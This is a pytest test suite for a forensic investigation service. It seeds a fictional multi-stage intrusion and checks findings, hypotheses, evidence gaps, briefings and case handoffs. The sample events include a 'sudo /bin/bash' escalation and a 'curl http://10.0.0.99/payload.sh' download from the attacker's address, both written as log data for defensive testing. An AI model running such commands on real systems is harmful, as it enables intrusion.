"""Milestone 5.11 Intelligence and Functional Test Suite.

Verifies:
- M11-INTEL-001: Evidence sufficiency categorical evaluation (no fake probabilities).
- M11-INTEL-002: Key findings structured synthesis from pinned evidence and transitions.
- M11-INTEL-003: Finding analyst review workflow (preserving epistemic separation).
- M11-INTEL-004: Competing hypotheses evaluation and determination.
- M11-INTEL-005: Prioritized evidence gaps and actionable remedies.
- M11-INTEL-006: Investigation question lifecycle and bounded tracking.
- M11-INTEL-007: Advisory closure readiness calculation and blocking factors.
- M11-INTEL-008: 15-section investigation briefing generation.
- M11-INTEL-009: Structured case handoff package and shift checklist.
- M11-INTEL-010: Analyst assessment authoring and provenance fingerprinting.
"""

from __future__ import annotations

import json
from pathlib import Path
import tempfile
from typing import Generator
import pytest

from logintel.ai.case_service import CaseService
from logintel.ai.domain.investigation_assessment import (
    ClosureReadinessState,
    EpistemicStatus,
    EvidenceSufficiencyState,
    FindingReviewState,
    GapPriority,
    QuestionStatus,
)
from logintel.storage.case_repo import CaseRepository
from logintel.storage.db import Database


@pytest.fixture
def intel_case_fixture() -> Generator[tuple[CaseService, int], None, None]:
    """Provide initialized case service and sample case for intelligence verification."""
    with tempfile.TemporaryDirectory() as td:
        forensic_path = Path(td) / "forensic.db"
        cases_path = Path(td) / "cases.db"

        forensic_db = Database(forensic_path)
        forensic_db.initialize()

        with forensic_db.connection() as conn:
            cur = conn.cursor()
            cur.execute(
                """
                INSERT INTO detection_rules (id, name, description, severity, category, rule_type, definition_yaml)
                VALUES
                ('rule.ssh.brute', 'SSH Brute Force', 'SSH attack pattern', 'ALERT', 'Authentication', 'threshold', 'yaml'),
                ('rule.sudo.abuse', 'Sudo Privilege Abuse', 'Privilege Escalation', 'ALERT', 'Privilege', 'threshold', 'yaml')
                """
            )
            cur.execute(
                """
                INSERT INTO incidents (id, incident_key, title, summary, severity, status, primary_host, primary_user, first_seen, last_seen, alert_count, event_count)
                VALUES
                (301, 'INC-301', 'Multi-stage Intrusion', 'SSH brute force into sudo abuse', 'ALERT', 'OPEN', 'bastion-01', 'admin', '2026-10-04T08:00:00Z', '2026-10-04T08:30:00Z', 2, 4)
                """
            )
            cur.execute(
                """
                INSERT INTO events (id, timestamp, ingested_at, host, source, event_type, severity, action, outcome, summary, raw_message, parser, event_fingerprint, username, src_ip)
                VALUES
                ('ev-101', '2026-10-04T08:00:00Z', '2026-10-04T08:00:01Z', 'bastion-01', 'auth.log', 'login', 'ALERT', 'login', 'failure', 'Failed SSH password for root', 'msg', 'p', 'fp-101', 'root', '10.0.0.99'),
                ('ev-102', '2026-10-04T08:02:00Z', '2026-10-04T08:02:01Z', 'bastion-01', 'auth.log', 'login', 'INFORMATIONAL', 'login', 'success', 'Accepted publickey for admin', 'msg', 'p', 'fp-102', 'admin', '10.0.0.99'),
                ('ev-103', '2026-10-04T08:15:00Z', '2026-10-04T08:15:01Z', 'bastion-01', 'audit.log', 'process', 'ALERT', 'exec', 'success', 'sudo /bin/bash', 'msg', 'p', 'fp-103', 'admin', '10.0.0.99'),
                ('ev-104', '2026-10-04T08:30:00Z', '2026-10-04T08:30:01Z', 'bastion-01', 'audit.log', 'process', 'NOTICE', 'exec', 'success', 'curl http://10.0.0.99/payload.sh', 'msg', 'p', 'fp-104', 'root', '10.0.0.99')
                """
            )
            conn.commit()

        case_repo = CaseRepository(db_path=cases_path, forensic_db=forensic_db)
        case_svc = CaseService(case_repository=case_repo, forensic_database=forensic_db)

        case = case_svc.create_or_open_case(incident_id=301, title="Case 301 - Bastion Compromise")
        case_svc.associate_evidence(case.case_id, "event", "ev-101", citation_tag="[event:ev-101]")
        case_svc.associate_evidence(case.case_id, "event", "ev-102", citation_tag="[event:ev-102]")
        case_svc.associate_evidence(case.case_id, "event", "ev-103", citation_tag="[event:ev-103]")
        case_svc.associate_evidence(case.case_id, "event", "ev-104", citation_tag="[event:ev-104]")

        yield case_svc, case.case_id


def test_m11_intel_001_evidence_sufficiency_evaluation(intel_case_fixture: tuple[CaseService, int]) -> None:
    """M11-INTEL-001: Validate categorical evidence sufficiency evaluation."""
    case_svc, case_id = intel_case_fixture
    assessment = case_svc.get_case_assessment(case_id, refresh=True)

    sufficiency = assessment.evidence_sufficiency
    assert sufficiency.status in {
        EvidenceSufficiencyState.SUFFICIENT,
        EvidenceSufficiencyState.PARTIALLY_SUFFICIENT,
        EvidenceSufficiencyState.INSUFFICIENT,
        EvidenceSufficiencyState.UNKNOWN,
    }
    assert isinstance(sufficiency.rationale, str)
    assert len(sufficiency.rationale) > 0
    assert len(sufficiency.existing_evidence) >= 4
    # Ensure no float or percentage confidence fields exist on sufficiency
    dump = sufficiency.model_dump()
    for key, val in dump.items():
        assert not isinstance(val, float), f"Floating-point score found in sufficiency: {key}={val}"


def test_m11_intel_002_structured_findings_synthesis(intel_case_fixture: tuple[CaseService, int]) -> None:
    """M11-INTEL-002: Validate structured findings synthesis."""
    case_svc, case_id = intel_case_fixture
    findings = case_svc.get_case_findings(case_id)

    assert len(findings) >= 4
    for f in findings:
        assert f.finding_id.startswith("f-") or f.finding_id.startswith("fnd-")
        assert f.title != ""
        assert f.description != ""
        assert f.epistemic_status in {EpistemicStatus.OBSERVED, EpistemicStatus.INFERRED, EpistemicStatus.UNKNOWN}
        assert f.review_state == FindingReviewState.UNREVIEWED
        assert len(f.evidence_references) > 0 or len(f.supporting_references) > 0


def test_m11_intel_003_finding_analyst_review_workflow(intel_case_fixture: tuple[CaseService, int]) -> None:
    """M11-INTEL-003: Validate analyst review workflow with strict epistemic preservation."""
    case_svc, case_id = intel_case_fixture
    findings = case_svc.get_case_findings(case_id)
    target = findings[0]

    initial_epistemic = target.epistemic_status

    # Review as ACCEPTED
    res = case_svc.review_case_finding(
        case_id=case_id,
        finding_id=target.finding_id,
        review_state="ACCEPTED",
        notes="Verified in bastion auth log by lead analyst.",
        actor="LeadAnalyst",
    )
    assert res["review_state"] == "ACCEPTED"
    assert res["epistemic_status_preserved"] is True

    # Re-fetch assessment and verify state updated while epistemic status is untouched
    updated_findings = case_svc.get_case_findings(case_id)
    reviewed = next(f for f in updated_findings if f.finding_id == target.finding_id)
    assert reviewed.review_state == FindingReviewState.ACCEPTED
    assert reviewed.reviewed_by == "LeadAnalyst"
    assert reviewed.review_notes == "Verified in bastion auth log by lead analyst."
    assert reviewed.epistemic_status == initial_epistemic


def test_m11_intel_004_competing_hypotheses_evaluation(intel_case_fixture: tuple[CaseService, int]) -> None:
    """M11-INTEL-004: Validate competing hypothesis derivation and evidence attachment."""
    case_svc, case_id = intel_case_fixture
    hypotheses = case_svc.get_case_hypotheses(case_id)

    assert len(hypotheses) >= 2
    statements = [h.statement for h in hypotheses]
    # Check that standard competing hypotheses are generated
    assert any("compromise" in s.lower() or "threat" in s.lower() for s in statements)
    for h in hypotheses:
        assert h.determination in {"SUPPORTING", "CONTRADICTING", "UNRESOLVED"}
        assert h.epistemic_status in {EpistemicStatus.OBSERVED, EpistemicStatus.INFERRED, EpistemicStatus.UNKNOWN}


def test_m11_intel_005_prioritized_evidence_gaps(intel_case_fixture: tuple[CaseService, int]) -> None:
    """M11-INTEL-005: Validate prioritized evidence gaps with actionable remedies."""
    case_svc, case_id = intel_case_fixture
    gaps = case_svc.get_case_gaps(case_id)

    assert isinstance(gaps, list)
    for g in gaps:
        assert g.gap_id.startswith("gap-")
        assert g.priority in {GapPriority.CRITICAL, GapPriority.HIGH, GapPriority.MEDIUM, GapPriority.LOW}
        assert g.description != ""
        assert g.actionable_remedy != ""
        assert g.epistemic_status in {EpistemicStatus.OBSERVED, EpistemicStatus.INFERRED, EpistemicStatus.UNKNOWN}


def test_m11_intel_006_investigation_question_lifecycle(intel_case_fixture: tuple[CaseService, int]) -> None:
    """M11-INTEL-006: Validate investigation question creation and status progression."""
    case_svc, case_id = intel_case_fixture

    # 1. Retrieve initial auto-generated questions
    questions = case_svc.get_case_questions(case_id)
    assert len(questions) > 0

    # 2. Add custom analyst question
    q_created = case_svc.create_case_question(
        case_id=case_id,
        question="Did bastion-01 establish outbound SSH tunnels?",
        category="NETWORK",
        related_evidence=["[event:ev-104]"],
        related_entities=["bastion-01", "10.0.0.99"],
        recommended_query="SELECT * FROM events WHERE host = 'bastion-01' AND raw_message LIKE '%tunnel%'",
        actor="Investigator-1",
    )
    assert q_created["question_id"].startswith("q-")
    assert q_created["status"] == "OPEN"

    # 3. Update question status to ANSWERED
    q_updated = case_svc.update_case_question_status(
        case_id=case_id,
        question_id=q_created["question_id"],
        status="ANSWERED",
        resolution_notes="No outbound SSH tunnels observed in network logs.",
        actor="Investigator-1",
    )
    assert q_updated["status"] == "ANSWERED"
    assert q_updated["resolution_notes"] == "No outbound SSH tunnels observed in network logs."

    # 4. Check that updated question reflects in assessment
    asmt = case_svc.get_case_assessment(case_id, refresh=True)
    matched = next(q for q in asmt.questions if q.question_id == q_created["question_id"])
    assert matched.status == QuestionStatus.ANSWERED


def test_m11_intel_007_closure_readiness_assessment(intel_case_fixture: tuple[CaseService, int]) -> None:
    """M11-INTEL-007: Validate advisory closure readiness and blocking factor identification."""
    case_svc, case_id = intel_case_fixture
    readiness = case_svc.get_closure_readiness(case_id)

    assert readiness.status in {
        ClosureReadinessState.READY,
        ClosureReadinessState.READY_WITH_LIMITATIONS,
        ClosureReadinessState.NOT_READY,
        ClosureReadinessState.UNKNOWN,
    }
    assert readiness.summary != ""
    # Initially findings are unreviewed, so there should be blocking factors or warnings
    assert len(readiness.blocking_factors) > 0 or len(readiness.warnings) > 0
    assert len(readiness.recommendations) > 0


def test_m11_intel_008_fifteen_section_briefing_generation(intel_case_fixture: tuple[CaseService, int]) -> None:
    """M11-INTEL-008: Validate complete 15-section investigation briefing generation."""
    case_svc, case_id = intel_case_fixture
    briefing = case_svc.get_investigation_briefing(case_id)

    expected_sections = [
        "Case Overview",
        "Investigation Scope",
        "Key Findings",
        "Temporal Reconstruction",
        "Attack Sequence",
        "Affected Entities",
        "Affected Hosts",
        "Incident Relationships",
        "MITRE ATT&CK Mapping",
        "Evidence Gaps",
        "Competing Hypotheses",
        "Unresolved Questions",
        "Analyst Assessment",
        "Closure Readiness",
        "Provenance",
    ]

    assert len(briefing.sections) == 15
    for sec in expected_sections:
        assert sec in briefing.sections, f"Missing briefing section: {sec}"
        assert len(briefing.sections[sec]) > 0

    assert briefing.briefing_text.startswith(f"# INVESTIGATION BRIEFING — CASE {case_id}")


def test_m11_intel_009_structured_case_handoff_package(intel_case_fixture: tuple[CaseService, int]) -> None:
    """M11-INTEL-009: Validate structured case handoff package."""
    case_svc, case_id = intel_case_fixture
    handoff = case_svc.get_case_handoff(case_id, actor="ShiftAnalyst-Day")

    assert handoff.handoff_id.startswith("hnd-")
    assert handoff.case_id == case_id
    assert handoff.operator == "ShiftAnalyst-Day"
    assert isinstance(handoff.case_summary, str)
    assert len(handoff.key_findings) >= 4
    assert isinstance(handoff.required_next_actions, list)


def test_m11_intel_010_analyst_assessment_authoring_and_provenance(intel_case_fixture: tuple[CaseService, int]) -> None:
    """M11-INTEL-010: Validate authoring analyst assessment, persistence, and SHA-256 provenance."""
    case_svc, case_id = intel_case_fixture

    note_text = "Primary compromise vector verified via stolen credentials, followed by immediate privilege escalation."
    updated_asmt = case_svc.record_analyst_assessment(
        case_id=case_id,
        analyst_assessment=note_text,
        actor="LeadForensicSpecialist",
    )

    assert updated_asmt.analyst_assessment == note_text
    assert note_text in updated_asmt.conclusion.statement
    assert updated_asmt.provenance.fingerprint.startswith("sha256:")
    assert len(updated_asmt.provenance.fingerprint.replace("sha256:", "")) == 64

    # Retrieve again from repository to ensure durability
    latest_asmt = case_svc.get_case_assessment(case_id, refresh=False)
    assert latest_asmt.analyst_assessment == note_text
